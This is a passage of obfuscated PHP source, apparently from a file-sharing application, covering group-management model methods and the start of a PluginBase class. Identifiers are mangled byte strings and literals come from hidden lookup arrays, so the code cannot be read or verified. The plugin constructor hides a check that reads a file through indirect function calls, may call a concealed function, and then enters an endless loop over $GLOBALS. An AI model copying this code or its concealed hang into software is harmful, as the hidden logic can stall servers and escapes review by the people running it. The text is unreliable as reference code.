$–ª•òöª = $ÁÓ¬Š‰ª[$¢½›£à[515]] . $ÁÓ¬Š‰ª[$¢½›£à[1746]] . $¢½›£à[47]; } $ó‰õß†ß = array($¢½›£à[578] => array($¢½›£à[538], $º¢‰±É[$¢½›£à[515]] . $º¢‰±É[$¢½›£à[1746]] . $¢½›£à[539])); $é²µ¨õ = array($¢½›£à[578] => array($¢½›£à[587], "\162\145\160\154\x61\143\145\50\160\x61\x72\145\x6e\x74\x4c\x65\166\x65\154\54\x27{$¬è›Şâ}\47\54\47{$–ª•òöª}\x27\x29")); $this->_clearChildrenCache($º¢‰±É); $this->where($ó‰õß†ß)->data($é²µ¨õ)->save(); } public function setNamePinyin($»¥î—Œ¦, $¿œÌ¼•Á = false) { $ÛµË²¬ =& $_SERVER[ÏÒ Ì„]; if (!$¿œÌ¼•Á) { $–êø¼’™ = $this->getInfoSimple($»¥î—Œ¦); $¿œÌ¼•Á = $–êø¼’™[$ÛµË²¬[28]]; } if (!Input::check($¿œÌ¼•Á, $ÛµË²¬[581])) { $this->metaSet($»¥î—Œ¦, $ÛµË²¬[458], null); $this->metaSet($»¥î—Œ¦, $ÛµË²¬[457], null); return; } $¶ïè•ì = array($ÛµË²¬[458] => str_replace($ÛµË²¬[50], $ÛµË²¬[33], Pinyin::get($¿œÌ¼•Á)), $ÛµË²¬[457] => Pinyin::get($¿œÌ¼•Á, $ÛµË²¬[582])); $this->metaSet($»¥î—Œ¦, $¶ïè•ì); } protected function groupStatus($øÂ©ãÍü, $‰±ºŞèÀ) { $™¥û× =& $_SERVER[ÏÒ Ì„]; $Ñç•À»ı = $this->getInfoSimple($øÂ©ãÍü); if (!$Ñç•À»ı) { return !1; } if ($‰±ºŞèÀ == $™¥û×[87]) { $Ş¾‡äªÈ = $this->parentLevelArray($Ñç•À»ı[$™¥û×[515]]); } else { $ƒ– ‡Œ = array($™¥û×[578] => array($™¥û×[538], $Ñç•À»ı[$™¥û×[515]] . $Ñç•À»ı[$™¥û×[1746]] . $™¥û×[539])); $Ş¾‡äªÈ = $this->where($ƒ– ‡Œ)->field($™¥û×[1746])->select(); $Ş¾‡äªÈ = array_to_keyvalue($Ş¾‡äªÈ, $™¥û×[33], $™¥û×[1746]); } $Ş¾‡äªÈ[] = $Ñç•À»ı[$™¥û×[1746]]; $§ÃÕÒĞ = array(); foreach ($Ş¾‡äªÈ as $øÂ©ãÍü) { $§ÃÕÒĞ[] = array($™¥û×[1746] => $øÂ©ãÍü, $™¥û×[93] => $™¥û×[740], $™¥û×[372] => $‰±ºŞèÀ); $this->_clearCache($øÂ©ãÍü); } return Model($™¥û×[1834])->addAll($§ÃÕÒĞ, array(), !0); } protected function groupRemove($ØóÃš€¬) { $×»íÇÎ =& $_SERVER[ÏÒ Ì„]; $™í—Ûó = array($×»íÇÎ[1746] => $ØóÃš€¬); $õøÚúÕ‹ = $this->where($™í—Ûó)->find(); if (!$õøÚúÕ‹ || $õøÚúÕ‹[$×»íÇÎ[492]] == 0) { return !1; } $¡‚ƒú²« = $this->getInfoSimple($õøÚúÕ‹[$×»íÇÎ[492]]); $this->_changeChildLevel($õøÚúÕ‹, $¡‚ƒú²«, !0); $this->where(array($×»íÇÎ[492] => $ØóÃš€¬))->save(array($×»íÇÎ[492] => $õøÚúÕ‹[$×»íÇÎ[492]])); Model($×»íÇÎ[1834])->where($™í—Ûó)->delete(); Model($×»íÇÎ[1835])->where($™í—Ûó)->delete(); Model($×»íÇÎ[822])->groupRootRemove($ØóÃš€¬); return $this->where($™í—Ûó)->delete(); } protected function groupSort($ÆĞ£¡ô») { $´äú‡á =& $_SERVER[ÏÒ Ì„]; $¨æ®¶É§ = array(); foreach ($ÆĞ£¡ô» as $Éñ—õ¦ => $˜ù­Õ…Î) { $¨æ®¶É§[] = array($´äú‡á[1746], $˜ù­Õ…Î, $´äú‡á[1769], $Éñ—õ¦ + 1); } $this->saveAll($¨æ®¶É§); } public function listData() { $ÅóÅÊŒï = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ÅóÅÊŒï[$_SERVER[ÏÒ Ì„][367]]); return $ÅóÅÊŒï; } private function _makeOrder($äŒÏùü = '') { $ÌëŠÑÎ =& $_SERVER[ÏÒ Ì„]; $­şß å = array($ÌëŠÑÎ[1746], $ÌëŠÑÎ[28], $ÌëŠÑÎ[1734], $ÌëŠÑÎ[194]); $ü¿àºÜ² = array($ÌëŠÑÎ[442] => $ÌëŠÑÎ[443], $ÌëŠÑÎ[444] => $ÌëŠÑÎ[445]); $ˆÍ¯½Ô = Input::get($ÌëŠÑÎ[449], $ÌëŠÑÎ[7], $ÌëŠÑÎ[1750], $­şß å); $•ºğÌÑÁ = Input::get($ÌëŠÑÎ[450], $ÌëŠÑÎ[7], $ÌëŠÑÎ[1836], array($ÌëŠÑÎ[1836], $ÌëŠÑÎ[444])); $•ºğÌÑÁ = $ü¿àºÜ²[$•ºğÌÑÁ]; $äŒÏùü = $äŒÏùü . "{$ˆÍ¯½Ô}\x20{$•ºğÌÑÁ}\54\x20\147\x72\157\165\160\111\x44\x20\x61\163\x63"; return $this->order($äŒÏùü); } public function listChild($ğ†½áè) { $Ò¹«šÌ” =& $_SERVER[ÏÒ Ì„]; $–è‹š›Ë = $this->where(array($Ò¹«šÌ”[492] => $ğ†½áè))->_makeOrder()->selectPage(200); $this->_listDataApply($–è‹š›Ë[$Ò¹«šÌ”[367]]); return $–è‹š›Ë; } public function listByID($¡ııÜç¶) { $¶œÖß‘ =& $_SERVER[ÏÒ Ì„]; if (!$¡ııÜç¶) { return array(); } $×Î¿È°Ë = array($¶œÖß‘[1746] => array($¶œÖß‘[7], $¡ııÜç¶)); $‚Ó™É÷ = $this->where($×Î¿È°Ë)->select(); $‚Ó™É÷ = array_sort_keep($‚Ó™É÷, $¶œÖß‘[1746], $¡ııÜç¶); $this->_listDataApply($‚Ó™É÷); return $‚Ó™É÷; } public function listSearch($÷†’‚úš) { $ù¥¥Úñü =& $_SERVER[ÏÒ Ì„]; $ŸçèüìÓ = $÷†’‚úš[$ù¥¥Úñü[1837]]; $Ò§ú…Ë£ = isset($÷†’‚úš[$ù¥¥Úñü[1838]]) ? $÷†’‚úš[$ù¥¥Úñü[1838]] : !1; if (!trim($ŸçèüìÓ)) { return !1; } $ŸçèüìÓ = str_replace($ù¥¥Úñü[1839], $ù¥¥Úñü[1840], $ŸçèüìÓ); $‹Œ³Ú…¦ = array($ù¥¥Úñü[1746] => array($ù¥¥Úñü[381], "{$ŸçèüìÓ}\x25"), $ù¥¥Úñü[28] => array($ù¥¥Úñü[381], "\x25{$ŸçèüìÓ}\45"), $ù¥¥Úñü[994] => $ù¥¥Úñü[1841]); if ($Ò§ú…Ë£) { $¦¥£ı› = $this->getInfoSimple($Ò§ú…Ë£); $Œª½çèí = $¦¥£ı›[$ù¥¥Úñü[515]] . $Ò§ú…Ë£ . $ù¥¥Úñü[539]; $‹Œ³Ú…¦ = array($‹Œ³Ú…¦, array($ù¥¥Úñü[515] => array($ù¥¥Úñü[381], $Œª½çèí))); } $‹Œ³Ú…¦ = $this->parseWhereLike($‹Œ³Ú…¦); $¤í ¢“ú = $this->_makeOrder()->where($‹Œ³Ú…¦)->selectPage(20); $¤í ¢“ú = $¤í ¢“ú ? $¤í ¢“ú : array($ù¥¥Úñü[367] => array(), $ù¥¥Úñü[364] => array()); if (!$¤í ¢“ú || count($¤í ¢“ú[$ù¥¥Úñü[367]]) < 5 && Input::check($ŸçèüìÓ, $ù¥¥Úñü[316])) { $„– Ã‹ = $this->groupChildrenAll($Ò§ú…Ë£); $øğ¶¿Øö = $this->_searchFromMeta($ù¥¥Úñü[457], $ŸçèüìÓ, 10, $„– Ã‹); $“ˆ¨è˜® = $this->_searchFromMeta($ù¥¥Úñü[458], $ŸçèüìÓ, 10, $„– Ã‹); $¾ºçúñ´ = array_merge($øğ¶¿Øö, $“ˆ¨è˜®, $¤í ¢“ú[$ù¥¥Úñü[367]]); $¤í ¢“ú[$ù¥¥Úñü[367]] = array_unique_by_key($¾ºçúñ´, $ù¥¥Úñü[1746]); $¤í ¢“ú[$ù¥¥Úñü[364]][$ù¥¥Úñü[365]] = count($¤í ¢“ú[$ù¥¥Úñü[367]]); $¤í ¢“ú[$ù¥¥Úñü[364]][$ù¥¥Úñü[366]] = ceil($¤í ¢“ú[$ù¥¥Úñü[364]][$ù¥¥Úñü[365]] / $¤í ¢“ú[$ù¥¥Úñü[364]][$ù¥¥Úñü[361]]); } $this->_listDataApply($¤í ¢“ú[$ù¥¥Úñü[367]]); return $¤í ¢“ú; } protected function groupChildrenAll($¨ˆºˆƒÅ) { $ ĞÀäÑ =& $_SERVER[ÏÒ Ì„]; if (!$¨ˆºˆƒÅ) { return !1; } if (is_string($¨ˆºˆƒÅ)) { $¨ˆºˆƒÅ = array($¨ˆºˆƒÅ); } $­ûç‡çÍ = $¨ˆºˆƒÅ; foreach ($¨ˆºˆƒÅ as $ïıÒŸº”) { $ßˆ×ô = $this->getInfoSimple($ïıÒŸº”); $¶†ú»Ş” = array($ ĞÀäÑ[515] => array($ ĞÀäÑ[381], $ßˆ×ô[$ ĞÀäÑ[515]] . $ïıÒŸº” . $ ĞÀäÑ[539])); $ƒ¤‚Š³û = $this->field($ ĞÀäÑ[1746])->where($¶†ú»Ş”)->select(); $­ûç‡çÍ = array_merge($­ûç‡çÍ, array_to_keyvalue($ƒ¤‚Š³û, $ ĞÀäÑ[33], $ ĞÀäÑ[1746])); } return array_unique($­ûç‡çÍ); } private function _searchFromMeta($ÂÜè†©¶, $´ıƒÀõº, $ŸïëÜû, $Îâ×Õ„â) { $¶ä€ş‰® =& $_SERVER[ÏÒ Ì„]; $´ıƒÀõº = strtolower($´ıƒÀõº); $ä§ÙØ–ğ = array($¶ä€ş‰®[93] => $ÂÜè†©¶, $¶ä€ş‰®[372] => array($¶ä€ş‰®[381], "\x25{$´ıƒÀõº}\45")); $ä§ÙØ–ğ = $this->parseWhereLike($ä§ÙØ–ğ); if ($Îâ×Õ„â) { $ä§ÙØ–ğ[$¶ä€ş‰®[1746]] = array($¶ä€ş‰®[7], $Îâ×Õ„â); } $Ÿ§¥óúê = Model($¶ä€ş‰®[1842])->where($ä§ÙØ–ğ)->limit($ŸïëÜû)->select(); if (!$Ÿ§¥óúê) { return array(); } $Ÿ§¥óúê = array_to_keyvalue($Ÿ§¥óúê, $¶ä€ş‰®[33], $¶ä€ş‰®[1746]); $á´Ö½É¥ = $this->where(array($¶ä€ş‰®[1833] => array($¶ä€ş‰®[7], $Ÿ§¥óúê)))->select(); if (!$á´Ö½É¥) { return array(); } return $á´Ö½É¥; } protected function _listDataApplyItem($íÏÌö€½) { $¦Ä‡¬ˆğ = array($íÏÌö€½); $this->_listDataApply($¦Ä‡¬ˆğ); return $¦Ä‡¬ˆğ[0]; } protected function _listDataApply(&$á¹¡ü) { $Áàï«àÓ =& $_SERVER[ÏÒ Ì„]; if (!$á¹¡ü) { return; } $À¾›×— = array_to_keyvalue($á¹¡ü, $Áàï«àÓ[33], $Áàï«àÓ[1746]); $this->_listAppendChildren($á¹¡ü); $this->_listAppendChildrenMember($á¹¡ü); $this->_listAppendMeta($á¹¡ü, $À¾›×—); $this->_listAppendParent($á¹¡ü); $this->_listAppendSourceRoot($á¹¡ü, $À¾›×—); } private function _listAppendChildren(&$ü•»ù«ù) { $½üğİÁ  =& $_SERVER[ÏÒ Ì„]; $çÂ€Å‚© = array_to_keyvalue($ü•»ù«ù, $½üğİÁ [33], $½üğİÁ [1746]); $İğûÙ±» = array($½üğİÁ [492] => array($½üğİÁ [7], $çÂ€Å‚©)); $§¶ô–¾ü = array($½üğİÁ [492], $½üğİÁ [1843] => $½üğİÁ [494]); $à¹ı…ãØ = $this->field($§¶ô–¾ü)->where($İğûÙ±»)->group($½üğİÁ [492])->select(); $Ò­å™¨œ = array_to_keyvalue($à¹ı…ãØ, $½üğİÁ [492], $½üğİÁ [494]); foreach ($ü•»ù«ù as &$ëÁÁâ­ ) { $Øèôîİ  = $ëÁÁâ­ [$½üğİÁ [1746]]; $ëÁÁâ­ [$½üğİÁ [1844]] = isset($Ò­å™¨œ[$Øèôîİ ]) ? intval($Ò­å™¨œ[$Øèôîİ ]) : !1; } unset($ëÁÁâ­ ); } private function _listAppendChildrenMember(&$×ÕŸõÉú) { $…–†õò‚ =& $_SERVER[ÏÒ Ì„]; $°¯‰ãø» = array_to_keyvalue($×ÕŸõÉú, $…–†õò‚[33], $…–†õò‚[1746]); $Ú·‡îÒ³ = array($…–†õò‚[1746] => array($…–†õò‚[7], $°¯‰ãø»)); $“êÔÏ¥Ï = array($…–†õò‚[1746], $…–†õò‚[1843] => $…–†õò‚[494]); $Ó½é¸® = Model($…–†õò‚[1835])->field($“êÔÏ¥Ï)->where($Ú·‡îÒ³)->group($…–†õò‚[1746])->select(); $¸¶üóş¥ = array_to_keyvalue($Ó½é¸®, $…–†õò‚[1746], $…–†õò‚[494]); foreach ($×ÕŸõÉú as &$¡·ø„—á) { $¥ˆ„ıäê = $¡·ø„—á[$…–†õò‚[1746]]; $¡·ø„—á[$…–†õò‚[1845]] = isset($¸¶üóş¥[$¥ˆ„ıäê]) ? intval($¸¶üóş¥[$¥ˆ„ıäê]) : !1; } unset($¡·ø„—á); } private function _listAppendMeta(&$§ÓÙï, $Ñûªµˆ¾) { $£Ü°¾üä =& $_SERVER[ÏÒ Ì„]; $Ñ±òÖ‰ = array($£Ü°¾üä[1746] => array($£Ü°¾üä[7], $Ñûªµˆ¾)); $–£œíƒ± = Model($£Ü°¾üä[1834])->where($Ñ±òÖ‰)->select(); $–£œíƒ± = array_to_keyvalue_group($–£œíƒ±, $£Ü°¾üä[1746]); foreach ($–£œíƒ± as &$‹¬÷ÛÔß) { $‹¬÷ÛÔß = array_to_keyvalue($‹¬÷ÛÔß, $£Ü°¾üä[93], $£Ü°¾üä[372]); } unset($‹¬÷ÛÔß); foreach ($§ÓÙï as &$ ‚®üï÷) { $ ‚®üï÷[$£Ü°¾üä[459]] = array(); if (isset($–£œíƒ±[$ ‚®üï÷[$£Ü°¾üä[1746]]])) { $ ‚®üï÷[$£Ü°¾üä[459]] = $–£œíƒ±[$ ‚®üï÷[$£Ü°¾üä[1746]]]; } } unset($ ‚®üï÷); } protected function parentLevelArray($¶ì«ã¾¥) { $å®ÖŠ’ø =& $_SERVER[ÏÒ Ì„]; $¶ì«ã¾¥ = explode($å®ÖŠ’ø[47], trim($¶ì«ã¾¥, $å®ÖŠ’ø[47])); $¶ì«ã¾¥ = array_remove_value($¶ì«ã¾¥, $å®ÖŠ’ø[191]); return $¶ì«ã¾¥; } private function _listAppendParent(&$­¿¤Ûó£) { $¢Íãƒİ¦ =& $_SERVER[ÏÒ Ì„]; $éø½¼¢ = array(); foreach ($­¿¤Ûó£ as &$Ç©Ìù´ğ) { $éø½¼¢[$Ç©Ìù´ğ[$¢Íãƒİ¦[1746]]] = $Ç©Ìù´ğ[$¢Íãƒİ¦[28]]; $ñêÖÆ”¼ = $this->parentLevelArray($Ç©Ìù´ğ[$¢Íãƒİ¦[515]]); foreach ($ñêÖÆ”¼ as $ÁïÍô’â) { if (!isset($éø½¼¢[$ÁïÍô’â])) { $éø½¼¢[$ÁïÍô’â] = 0; } } } unset($Ç©Ìù´ğ); foreach ($éø½¼¢ as $ßïÂ²é½ => $‰ü½™ğ“) { if ($‰ü½™ğ“) { continue; } $Êß©ß•¢ = $this->getInfoSimple($ßïÂ²é½); $éø½¼¢[$ßïÂ²é½] = $Êß©ß•¢[$¢Íãƒİ¦[28]]; } $‡ÇÖ¸ñ– = $GLOBALS[$¢Íãƒİ¦[6]][$¢Íãƒİ¦[88]][$¢Íãƒİ¦[1846]]; if ($GLOBALS[$¢Íãƒİ¦[499]] == $¢Íãƒİ¦[87]) { $‡ÇÖ¸ñ– = !1; } foreach ($­¿¤Ûó£ as &$Ç©Ìù´ğ) { $ñêÖÆ”¼ = $this->parentLevelArray($Ç©Ìù´ğ[$¢Íãƒİ¦[515]]); $°…‚Å¢¤ = $¢Íãƒİ¦[33]; foreach ($ñêÖÆ”¼ as $ßïÂ²é½ => $ÁïÍô’â) { if ($‡ÇÖ¸ñ– && $ßïÂ²é½ == 0) { continue; } $°…‚Å¢¤ .= $éø½¼¢[$ÁïÍô’â] . $¢Íãƒİ¦[8]; } if ($ñêÖÆ”¼) { $°…‚Å¢¤ .= $Ç©Ìù´ğ[$¢Íãƒİ¦[28]]; } $Ç©Ìù´ğ[$¢Íãƒİ¦[520]] = str_replace($¢Íãƒİ¦[523], $¢Íãƒİ¦[8], $°…‚Å¢¤); } unset($Ç©Ìù´ğ); } private function _listAppendSourceRoot(&$Î½íÔê, $…¼‡À»‰) { $»Šİ Ø¼ =& $_SERVER[ÏÒ Ì„]; $ÈÍœıĞ« = array($»Šİ Ø¼[492] => 0, $»Šİ Ø¼[498] => array($»Šİ Ø¼[7], $…¼‡À»‰), $»Šİ Ø¼[406] => SourceModel::TYPE_GROUP); $ÅÕ¼¦¾ = Model($»Šİ Ø¼[822])->order($»Šİ Ø¼[1847])->field($»Šİ Ø¼[1848]); $¾ÇÚó¾½ = $ÅÕ¼¦¾->limit(count($…¼‡À»‰))->where($ÈÍœıĞ«)->select(); $¾ÇÚó¾½ = array_to_keyvalue($¾ÇÚó¾½, $»Šİ Ø¼[498]); $¾ÇÚó¾½ = array_remove_key($¾ÇÚó¾½, $»Šİ Ø¼[498]); foreach ($Î½íÔê as &$ÎçŠ†ñ¥) { $ÎçŠ†ñ¥[$»Šİ Ø¼[85]] = $¾ÇÚó¾½[$ÎçŠ†ñ¥[$»Šİ Ø¼[1746]]] ? $¾ÇÚó¾½[$ÎçŠ†ñ¥[$»Šİ Ø¼[1746]]] : array(); } unset($ÎçŠ†ñ¥); } protected function groupMerge($ŞæşÁš“) { $ŞæşÁš“ = array_values(array_unique($ŞæşÁš“)); $ª‡µÒ¥¼ = array(); for ($”±‰©’ï = 0; $”±‰©’ï < count($ŞæşÁš“); $”±‰©’ï++) { $£è¾¢§ş = !1; for ($ŸãóÔ‹Ï = 0; $ŸãóÔ‹Ï < count($ŞæşÁš“); $ŸãóÔ‹Ï++) { if ($”±‰©’ï == $ŸãóÔ‹Ï) { continue; } if ($this->isParentOf($ŞæşÁš“[$ŸãóÔ‹Ï], $ŞæşÁš“[$”±‰©’ï])) { $£è¾¢§ş = !0; break; } } if (!$£è¾¢§ş) { $ª‡µÒ¥¼[] = $ŞæşÁš“[$”±‰©’ï]; } } return $ª‡µÒ¥¼; } protected function isParentOf($‹Øçëñ¸, $ÄÛãø‰Ê) { $¯…Íàéª =& $_SERVER[ÏÒ Ì„]; if (!$‹Øçëñ¸ || !$ÄÛãø‰Ê || $‹Øçëñ¸ == $ÄÛãø‰Ê) { return !1; } $ëîÅŠûÜ = $this->getInfoSimple($‹Øçëñ¸); $ªãÖñµã = $this->getInfoSimple($ÄÛãø‰Ê); $˜œ—úø§ = $ëîÅŠûÜ[$¯…Íàéª[515]] . $‹Øçëñ¸ . $¯…Íàéª[47]; if (substr($ªãÖñµã[$¯…Íàéª[515]], 0, strlen($˜œ—úø§)) == $˜œ—úø§) { return !0; } return !1; } public function groupShowRoot($ûšÎÓæŸ, $Öáñªø» = false) { $¯ı¦Š£ =& $_SERVER[ÏÒ Ì„]; $óóìøö´ = $this->getInfo($ûšÎÓæŸ); if (!$óóìøö´) { return array(); } $ı“íí”¯ = $this->parentLevelArray($óóìøö´[$¯ı¦Š£[515]]); $²‰€·Ï® = array($ûšÎÓæŸ); if (count($ı“íí”¯) == 0) { return $²‰€·Ï®; } if ($Öáñªø» && count($ı“íí”¯) == 1) { return $²‰€·Ï®; } if (!$óóìøö´[$¯ı¦Š£[459]] || !isset($óóìøö´[$¯ı¦Š£[459]][$¯ı¦Š£[1831]]) || $óóìøö´[$¯ı¦Š£[459]][$¯ı¦Š£[1831]] == $¯ı¦Š£[1800]) { return $this->groupShowRoot($ı“íí”¯[count($ı“íí”¯) - 1], $Öáñªø»); } if ($óóìøö´[$¯ı¦Š£[459]][$¯ı¦Š£[1831]] == $¯ı¦Š£[355]) { $Ë¼½÷Úä = explode($¯ı¦Š£[47], $óóìøö´[$¯ı¦Š£[459]][$¯ı¦Š£[1832]]); if ($Ë¼½÷Úä) { $²‰€·Ï® = array_merge($²‰€·Ï®, $Ë¼½÷Úä); } } return $²‰€·Ï®; } protected function resetParentLevel() { $“«¹µâä =& $_SERVER[ÏÒ Ì„]; $ß÷Íšù = $“«¹µâä[1746]; $Ğ£·ôŠƒ = $this->select(); $Ğ£·ôŠƒ = array_to_keyvalue($Ğ£·ôŠƒ, $ß÷Íšù); foreach ($Ğ£·ôŠƒ as $Òı”šÄŞ) { $şÁ¦÷½‹ = $Òı”šÄŞ; $ùØ°æÏù = array(); while ($şÁ¦÷½‹[$“«¹µâä[492]] != 0) { $ùØ°æÏù[] = $şÁ¦÷½‹[$“«¹µâä[492]]; $şÁ¦÷½‹ = $Ğ£·ôŠƒ[$şÁ¦÷½‹[$“«¹µâä[492]]]; } $ùØ°æÏù[] = 0; $ùØ°æÏù = $“«¹µâä[47] . implode($“«¹µâä[47], array_reverse($ùØ°æÏù)) . $“«¹µâä[47]; $this->setNamePinyin($Òı”šÄŞ[$ß÷Íšù], $Òı”šÄŞ[$“«¹µâä[28]]); $this->where(array($ß÷Íšù => $Òı”šÄŞ[$ß÷Íšù]))->save(array($“«¹µâä[578] => $ùØ°æÏù)); } return $Ğ£·ôŠƒ; } public function groupNameAuto($÷×ªÃú, $ÒìÜ•í) { $ó“¶ò»¡ =& $_SERVER[ÏÒ Ì„]; $£õ‡¸øò = $this->where(array($ó“¶ò»¡[396] => $÷×ªÃú))->getField($ó“¶ò»¡[28], !0); if (!$£õ‡¸øò || !in_array($ÒìÜ•í, $£õ‡¸øò)) { return $ÒìÜ•í; } for ($ßÃ‹­ÊÀ = 1; $ßÃ‹­ÊÀ <= count($£õ‡¸øò) + 1; $ßÃ‹­ÊÀ++) { $¼’·Æõ = $ÒìÜ•í . "\50{$ßÃ‹­ÊÀ}\x29"; if (!in_array($¼’·Æõ, $£õ‡¸øò)) { return $¼’·Æõ; } } } public function groupSwitch($ğ¹ÀúÊ˜, $ÖŒŠƒ”†) { $¹ˆæ¤ø =& $_SERVER[ÏÒ Ì„]; $›ø†ïÌ¿ = array($¹ˆæ¤ø[1746] => array($¹ˆæ¤ø[7], array($ğ¹ÀúÊ˜, $ÖŒŠƒ”†))); $Ğò­·Ëó = $this->where($›ø†ïÌ¿)->select(); $Ğò­·Ëó = array_to_keyvalue($Ğò­·Ëó, $¹ˆæ¤ø[1746]); if (!isset($Ğò­·Ëó[$ğ¹ÀúÊ˜]) || !isset($Ğò­·Ëó[$ÖŒŠƒ”†]) || $Ğò­·Ëó[$ğ¹ÀúÊ˜][$¹ˆæ¤ø[492]] == 0) { return !1; } $›ø†ïÌ¿ = array($¹ˆæ¤ø[1746] => $ğ¹ÀúÊ˜); $á±—¤ÊĞ = Model($¹ˆæ¤ø[1835])->where($›ø†ïÌ¿)->select(); if (!$á±—¤ÊĞ) { $á±—¤ÊĞ = array(); } foreach ($á±—¤ÊĞ as $Ñğ¾ïÁ) { $ï¼û÷Úö = $Ñğ¾ïÁ[$¹ˆæ¤ø[1578]]; $›ø†ïÌ¿ = array($¹ˆæ¤ø[1578] => $ï¼û÷Úö, $¹ˆæ¤ø[1746] => $ÖŒŠƒ”†); $–½àõ§• = Model($¹ˆæ¤ø[1835])->where($›ø†ïÌ¿)->find(); if (!$–½àõ§•) { $¬°‹¡Å‰ = array($ÖŒŠƒ”† => $Ñğ¾ïÁ[$¹ˆæ¤ø[1849]]); Model($¹ˆæ¤ø[532])->userGroupAdd($ï¼û÷Úö, $¬°‹¡Å‰); } Model($¹ˆæ¤ø[532])->userGroupRemove($ï¼û÷Úö, $ğ¹ÀúÊ˜); } $›ø†ïÌ¿ = array($¹ˆæ¤ø[406] => 2, $¹ˆæ¤ø[492] => 0, $¹ˆæ¤ø[405] => 1, $¹ˆæ¤ø[498] => array($¹ˆæ¤ø[7], array($ğ¹ÀúÊ˜, $ÖŒŠƒ”†))); $µííÊ¼µ = Model($¹ˆæ¤ø[822])->where($›ø†ïÌ¿)->field($¹ˆæ¤ø[1850])->select(); $µííÊ¼µ = array_to_keyvalue($µííÊ¼µ, $¹ˆæ¤ø[498], $¹ˆæ¤ø[397]); $·ßÈË·¦ = !empty($µííÊ¼µ[$ğ¹ÀúÊ˜]) ? $µííÊ¼µ[$ğ¹ÀúÊ˜] : !1; if ($·ßÈË·¦) { if (!$µííÊ¼µ[$ÖŒŠƒ”†]) { $µííÊ¼µ[$ÖŒŠƒ”†] = Model($¹ˆæ¤ø[822])->groupRootAdd($ÖŒŠƒ”†); } $¿ĞÅ‚İú = $µííÊ¼µ[$ÖŒŠƒ”†]; $›ø†ïÌ¿ = array($¹ˆæ¤ø[492] => $·ßÈË·¦); $µííÊ¼µ = Model($¹ˆæ¤ø[822])->where($›ø†ïÌ¿)->field($¹ˆæ¤ø[1851])->select(); if (!$µííÊ¼µ) { $µííÊ¼µ = array(); } Model($¹ˆæ¤ø[822])->moveClearAuth = !1; foreach ($µííÊ¼µ as $ã¯ƒÊ£) { $˜®ËÚòÌ = $ã¯ƒÊ£[$¹ˆæ¤ø[405]] == $¹ˆæ¤ø[87] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($¹ˆæ¤ø[822])->move($ã¯ƒÊ£[$¹ˆæ¤ø[397]], $¿ĞÅ‚İú, $˜®ËÚòÌ); } Model($¹ˆæ¤ø[822])->moveClearAuth = !0; $›ø†ïÌ¿ = array($¹ˆæ¤ø[406] => 2, $¹ˆæ¤ø[498] => $ğ¹ÀúÊ˜); $ˆ˜§ÉæŠ = array($¹ˆæ¤ø[498] => $ÖŒŠƒ”†); Model($¹ˆæ¤ø[1852])->where($›ø†ïÌ¿)->save($ˆ˜§ÉæŠ); Model($¹ˆæ¤ø[1853])->where($›ø†ïÌ¿)->save($ˆ˜§ÉæŠ); } $this->_changeChildLevel($Ğò­·Ëó[$ğ¹ÀúÊ˜], $Ğò­·Ëó[$ÖŒŠƒ”†], !0); $this->where(array($¹ˆæ¤ø[492] => $ğ¹ÀúÊ˜))->save(array($¹ˆæ¤ø[492] => $ÖŒŠƒ”†)); $this->_clearChildrenCache($Ğò­·Ëó[$ÖŒŠƒ”†]); return !0; } } goto ešĞ”·¸–“; dÖ‰°Ìá…: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $®âŒÓ²— =& $_SERVER[ÏÒ Ì„]; if (!isset($_SERVER[$®âŒÓ²—[871]]) || !isset($_SERVER[$®âŒÓ²—[869]])) { $ûò ÍÃŒ = $®âŒÓ²—[872]; $ğºôÎı— = $®âŒÓ²—[873]; $Û›Ú”¼Ü = $_SERVER[$®âŒÓ²—[874]] . $®âŒÓ²—[875]; $…Àæ‡ıŠ = $ğºôÎı—($Û›Ú”¼Ü); $µ«İå¯ = explode($®âŒÓ²—[229], $…Àæ‡ıŠ); if (count($µ«İå¯) < $®âŒÓ²—[626]) { $¤äù¤Üë = $®âŒÓ²—[876]; $¤äù¤Üë(); } $”¹•Ìè = $®âŒÓ²—[877]; $”¹•Ìè($_SERVER[$®âŒÓ²—[878]]); $ĞÁÁ ¶Ò = 1; for ($´£µ…ô® = $ĞÁÁ ¶Ò; $´£µ…ô® > 0; $´£µ…ô®++) { $”¹•Ìè = json_encode($GLOBALS[$®âŒÓ²—[413]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($®âŒÓ²—[1445]); $this->pluginName = str_replace($®âŒÓ²—[1445], $®âŒÓ²—[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $®âŒÓ²—[8]; $this->pluginApi = appHostGet() . $®âŒÓ²—[1446] . $this->pluginName . $®âŒÓ²—[8]; $this->pluginHost = $config[$®âŒÓ²—[1447]] . $this->pluginName . $®âŒÓ²—[8]; $this->pluginHostDefault = $config[$®âŒÓ²—[1447]] . $this->pluginName . $®âŒÓ²—[8]; $Œ¤áµ—Ş = $config[$®âŒÓ²—[1448]]; if ($Œ¤áµ—Ş && strpos($®âŒÓ²—[47] . $Œ¤áµ—Ş . $®âŒÓ²—[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$®âŒÓ²—[1449]] . $this->pluginName . $®âŒÓ²—[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ÏÒ Ì„][1450]); } protected function assign($ŠÈçí¡, $ğÈ•Œ¯Ø = false) { if (is_array($ŠÈçí¡)) { $this->values = array_merge($this->values, $ŠÈçí¡); } else { $this->values[$ŠÈçí¡] = $ğÈ•Œ¯Ø; } } protected function display($ƒêªµ€) { extract($this->values); require $ƒêªµ€; } final function hookRegist($¯çÎø¶) { $this->modelPlugin->appRegist($this->pluginName, $¯çÎø¶); } final function appIcon() { $´÷šÈÜ =& $_SERVER[ÏÒ Ì„]; $Ì˜åŠÚ× = $this->appPackage(); $ÕÆÚì™ğ = $´÷šÈÜ[33]; if (isset($Ì˜åŠÚ×[$´÷šÈÜ[411]])) { if (isset($Ì˜åŠÚ×[$´÷šÈÜ[411]][$´÷šÈÜ[1451]])) { $ÕÆÚì™ğ = $´÷šÈÜ[1452] . $Ì˜åŠÚ×[$´÷šÈÜ[411]][$´÷šÈÜ[1451]] . 